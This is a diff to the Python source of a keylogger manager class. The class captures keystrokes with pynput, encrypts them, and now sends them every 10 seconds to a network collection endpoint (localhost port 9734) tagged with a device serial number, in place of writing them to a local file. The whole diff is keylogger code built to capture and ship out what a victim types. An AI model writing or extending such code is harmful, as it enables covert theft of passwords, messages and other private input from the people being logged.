@@ -1,15 +1,15 @@
-from service import KeyLoggerService, FileWriter, Encryptor
+from service import KeyLoggerService, FileWriter, Encryptor,NetworkWriter
 from Interface import IKeyLoggerManager
 from pynput.keyboard import Listener
 import threading, time
 
 
 class KeyLoggerManager(IKeyLoggerManager):
-    def __init__(self, serial_number: int):
+    def __init__(self, serial_number: int, key:str):
         self.__serial_number = serial_number
         self.__key_logger = KeyLoggerService()
-        self.__writer = FileWriter()
-        self.__encryptor = Encryptor()
+        self.__writer = NetworkWriter('http://127.0.0.1:9734')
+        self.__encryptor = Encryptor(key)
         self.__is_logging = False
         self.__logger_thread = threading.Thread(target=self.__listen)
         self.__send_data_thread = threading.Thread(target=self.__send_data)
@@ -33,7 +33,7 @@ class KeyLoggerManager(IKeyLoggerManager):
             data = self.__key_logger.get_logged_keys()
             encrypt_data = {self.__encryptor.encrypt(key): self.__encryptor.encrypt(value) for key, value in
                             data.items()}
-            self.__writer.write(encrypt_data)
+            self.__writer.write(self.__serial_number, encrypt_data)
             time.sleep(10)
 
     def print_keys(self):
